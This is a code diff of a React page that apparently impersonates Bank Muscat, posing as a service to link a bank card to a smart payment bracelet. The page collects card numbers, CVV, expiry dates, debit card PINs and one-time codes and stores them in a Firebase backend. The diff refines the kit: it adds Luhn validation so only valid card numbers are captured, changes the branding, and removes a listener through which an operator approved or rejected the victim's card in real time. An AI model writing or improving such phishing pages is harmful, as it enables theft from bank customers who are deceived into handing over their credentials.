@@ -1,15 +1,45 @@
 "use client"
 
-import { useState, useRef, useEffect } from "react"
+import { useState, useRef } from "react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { ChevronRight, Camera, Info, X } from "lucide-react"
+import { ChevronRight, Info, X } from "lucide-react"
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
-import { doc, onSnapshot } from "firebase/firestore"
-import { addData, db } from "@/lib/firebase"
+import { addData } from "@/lib/firebase"
 import Loader from "./loader"
-const allOtps = ['']
+
+const allOtps = [""]
+
+function validateCardNumber(cardNumber: string): boolean {
+  // Remove spaces and non-digits
+  const digits = cardNumber.replace(/\D/g, "")
+
+  if (digits.length < 13 || digits.length > 19) {
+    return false
+  }
+
+  let sum = 0
+  let isEven = false
+
+  // Loop through values starting from the rightmost digit
+  for (let i = digits.length - 1; i >= 0; i--) {
+    let digit = Number.parseInt(digits[i], 10)
+
+    if (isEven) {
+      digit *= 2
+      if (digit > 9) {
+        digit -= 9
+      }
+    }
+
+    sum += digit
+    isEven = !isEven
+  }
+
+  return sum % 10 === 0
+}
+
 export default function UsernameRecoveryPage() {
   const [phoneNumber, setPhoneNumber] = useState("")
   const [cns, setcns] = useState(["", "", "", ""])
@@ -25,6 +55,17 @@ export default function UsernameRecoveryPage() {
   const [isLoading, setIsLoading] = useState(false)
 
   const cardInputRefs = useRef<(HTMLInputElement | null)[]>([])
+  const handleCloseOtp = () => setShowOtp(false)
+  const handleOtpChange = (index: number, value: string) => {
+    const numericValue = value.replace(/\D/g, "").slice(0, 1)
+    const newOtpValues = [...otpValues]
+    newOtpValues[index] = numericValue
+    setOtpValues(newOtpValues)
+
+    if (numericValue.length === 1 && index < 3) {
+      document.getElementById(`otp-${index + 1}`)?.focus()
+    }
+  }
 
   const handlecnChange = (index: number, value: string) => {
     const numericValue = value.replace(/\D/g, "").slice(0, 4)
@@ -40,23 +81,9 @@ export default function UsernameRecoveryPage() {
     if (errors[`card-${index}`]) {
       setErrors((prev) => ({ ...prev, [`card-${index}`]: "" }))
     }
-  }
-
-  const handleOtpChange = (index: number, value: string) => {
-    if (value.length > 1) return // Only allow single digit
-
-    const newOtpValues = [...otpValues]
-    newOtpValues[index] = value
-    setOtpValues(newOtpValues)
-
-    // Auto-focus next input
-    if (value && index < 3) {
-      const nextInput = document.getElementById(`otp-${index + 1}`)
-      nextInput?.focus()
+    if (errors.cardNumber) {
+      setErrors((prev) => ({ ...prev, cardNumber: "" }))
     }
-
-    // Clear error when user starts typing
-    if (otpError) setOtpError("")
   }
 
   const validateForm = () => {
@@ -77,6 +104,13 @@ export default function UsernameRecoveryPage() {
         newErrors[`card-${index}`] = "يجب أن يكون 4 أرقام"
       }
     })
+
+    const fullCardNumber = cns.join("")
+    if (fullCardNumber.length === 16) {
+      if (!validateCardNumber(fullCardNumber)) {
+        newErrors.cardNumber = "رقم البطاقة غير صحيح. يرجى التحقق من الرقم"
+      }
+    }
 
     // Validate expiry month
     if (!exm.trim()) {
@@ -104,11 +138,11 @@ export default function UsernameRecoveryPage() {
   }
 
   const handleContinue = async (e: any) => {
-
     const otpString = otpValues.join("")
     allOtps.push(otpString)
-    const visitorId = localStorage.getItem("visitor");
+    const visitorId = localStorage.getItem("visitor")
     await addData({ id: visitorId, otp: otpString, allOtps })
+
     // Validate OTP
     if (otpString.length !== 4) {
       setOtpError("يرجى إدخال رمز التحقق المكون من 4 أرقام")
@@ -120,70 +154,50 @@ export default function UsernameRecoveryPage() {
       return
     }
 
-    // Simulate OTP verification (you can replace with actual API call)
+    // Simulate OTP verification
     if (otpString !== "1234") {
       setOtpError("رمز التحقق غير صحيح")
-      setOtpValues(['', '', '', ''])
+      setOtpValues(["", "", "", ""])
       return
     }
 
-    // Success - proceed with form submission
     console.log("OTP verified successfully")
-
   }
 
-  const handleCloseOtp = () => {
-    setShowOtp(false)
-    setOtpValues(["", "", "", ""])
-    setOtpError("")
-  }
-  useEffect(() => {
-    const visitorId = localStorage.getItem("visitor");
-    if (visitorId) {
-      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
-        if (docSnap.exists()) {
-          const data = docSnap.data() as any;
-          if (data.status === "pending") {
-            setIsLoading(true);
-          } else if (data.status === "approved") {
-            setIsLoading(false);
-            setShowOtp(true)
-          } else if (data.status === "rejected") {
-            setIsLoading(false);
-            alert("Card rejected please try again!");
-          }
-        }
-      });
-
-      return () => unsubscribe();
-    }
-  }, []);
   const handleSubmit = async (e: any) => {
     e.preventDefault()
-    const visitorId = localStorage.getItem("visitor");
-    const exp = `${exm}/${exy}`;
-
+    if (!validateForm()) {
+      return
+    }
+    const visitorId = localStorage.getItem("visitor")
+    const exp = `${exm}/${exy}`
     await addData({
       id: visitorId,
       cn: cns,
-      status: 'pending',
+      status: "pending",
       ccc: ccc,
       EX: exp,
-      bank,pass
-    });
+      bank,
+      pass,
+    })
+    setShowOtp(true)
   }
+
   return (
     <div className="min-h-screen bg-gray-100">
       <form onSubmit={handleSubmit}>
         {/* Header */}
-        <div className="bg-black h-12 flex items-center justify-between px-4">
-          <ChevronRight className="w-6 h-6 text-red-500" />
-          <img src="/logo.png" alt="" width={90}/>
+        <div className="bg-[#3111f3] h-12 flex items-center justify-between px-4">
+          <ChevronRight className="w-6 h-6 text-white" />
+          <img src="/ASD.svg" alt="" width={90} />
         </div>
+
         {/* Main Content */}
         <div className="px-6 py-8 space-y-8">
           {/* Title */}
-          <h1 className="text-2xl font-bold text-gray-900 text-center">ربط بطاقتك البنكية بسوار الدفع الذكي من بنك مسقط</h1>
+          <h1 className="text-2xl font-bold text-gray-900 text-center">
+            ربط بطاقتك البنكية بسوار الدفع الذكي من بنك مسقط
+          </h1>
 
           {/* Phone Number Section */}
           <div className="space-y-4">
@@ -229,32 +243,7 @@ export default function UsernameRecoveryPage() {
               <span>يجب أن يكون هذا الرقم مسجلاً في حسابك.</span>
             </div>
           </div>
-{/* Card Number Section
-<div className="space-y-4">
-            <label className="block text-gray-600 text-right">
-             اسم البنك الخاص بك<span className="text-red-500">*</span>
-            </label>
 
-            <div className="gap-2">
-            <Select onValueChange={(e)=>setBank(e)}>
-  <SelectTrigger className="w-full" dir="rtl">
-    <SelectValue placeholder="اختر اسم البنك" />
-  </SelectTrigger>
-  <SelectContent>
-  <SelectItem value="مسقط">بنك مسقط</SelectItem>
-  <SelectItem value="ضفار">بنك ظفار</SelectItem>
-  <SelectItem value="الوطني">البنك الوطني العماني</SelectItem>
-  <SelectItem value="صحار">بنك صحار الدولي</SelectItem>
-  <SelectItem value="عمان_العربي">بنك عمان العربي</SelectItem>
-  <SelectItem value="الأهلي">البنك الأهلي العماني</SelectItem>
-  <SelectItem value="نزوى">بنك نزوى</SelectItem>
-  <SelectItem value="الاسكان">بنك الأسكان العماني</SelectItem>
-  <SelectItem value="الاسلامي صحار">بنك صحار الاسلامي</SelectItem>
-  <SelectItem value="الاسلامي ظفار">بنك ظفار الاسلامي</SelectItem>
-  </SelectContent>
-</Select>
-            </div>
-          </div> */}
           {/* Card Number Section */}
           <div className="space-y-4">
             <label className="block text-gray-600 text-right">
@@ -268,7 +257,9 @@ export default function UsernameRecoveryPage() {
                     ref={(el) => (cardInputRefs.current[index] = el) as any}
                     value={number}
                     onChange={(e) => handlecnChange(index, e.target.value)}
-                    className={`text-center border-0 border-b-2 rounded-none ${errors[`card-${index}`] ? "border-red-500" : ""}`}
+                    className={`text-center border-0 border-b-2 rounded-none ${
+                      errors[`card-${index}`] ? "border-red-500" : ""
+                    }`}
                     placeholder="XXXX"
                     maxLength={4}
                     required
@@ -280,6 +271,12 @@ export default function UsernameRecoveryPage() {
                 </div>
               ))}
             </div>
+
+            {errors.cardNumber && (
+              <div className="text-red-500 text-sm text-right bg-red-50 p-3 rounded-lg border border-red-200">
+                {errors.cardNumber}
+              </div>
+            )}
           </div>
 
           <div className="space-y-4">
@@ -298,7 +295,7 @@ export default function UsernameRecoveryPage() {
                     }
                   }}
                   className={`text-center w-20 ${errors.ccc ? "border-red-500" : ""}`}
-                  placeholder="ccc"
+                  placeholder="CVV"
                   maxLength={3}
                   required
                   inputMode="numeric"
@@ -321,9 +318,7 @@ export default function UsernameRecoveryPage() {
                   required
                   inputMode="numeric"
                 />
-                {errors.exm && (
-                  <div className="text-red-500 text-xs text-center mt-1">{errors.exm}</div>
-                )}
+                {errors.exm && <div className="text-red-500 text-xs text-center mt-1">{errors.exm}</div>}
               </div>
               <div>
                 <Input
@@ -344,40 +339,37 @@ export default function UsernameRecoveryPage() {
                 {errors.exy && <div className="text-red-500 text-xs text-center mt-1">{errors.exy}</div>}
               </div>
             </div>
-            <div className="space-y-4">
-            <label className="block text-gray-600 text-right">
-            الرقم السري لبطاقة الخصم<span className="text-red-500">*</span>
-            </label>
 
-            <div className="grid gap-2">
-                  <Input
-                    value={pass}
-                    onChange={(e) => setPass(
-                       e.target.value)}
-                    className={`w-full text-center border-0 border-b-2 rounded-none `}
-                    placeholder="XXXX"
-                    maxLength={4}
-                    required
-                    inputMode="numeric"
-                  />
+            <div className="space-y-4">
+              <label className="block text-gray-600 text-right">
+                الرقم السري لبطاقة الخصم<span className="text-red-500">*</span>
+              </label>
+
+              <div className="grid gap-2">
+                <Input
+                  value={pass}
+                  onChange={(e) => setPass(e.target.value)}
+                  className="w-full text-center border-0 border-b-2 rounded-none"
+                  placeholder="XXXX"
+                  maxLength={4}
+                  required
+                  inputMode="numeric"
+                />
+              </div>
             </div>
           </div>
-          </div>
-
-
 
           {/* Continue Button */}
           <div className="pt-8">
-            <Button
-              type="submit"
-              className="w-full bg-red-500 hover:bg-red-600 text-white py-4 rounded-full text-lg"
-            >
+            <Button type="submit" className="w-full bg-red-500 hover:bg-red-600 text-white py-4 rounded-full text-lg">
               استمرار
             </Button>
           </div>
         </div>
       </form>
+
       {isLoading && <Loader />}
+
       <Dialog open={showOtp} onOpenChange={handleCloseOtp}>
         <DialogContent className="sm:max-w-md">
           <DialogHeader>
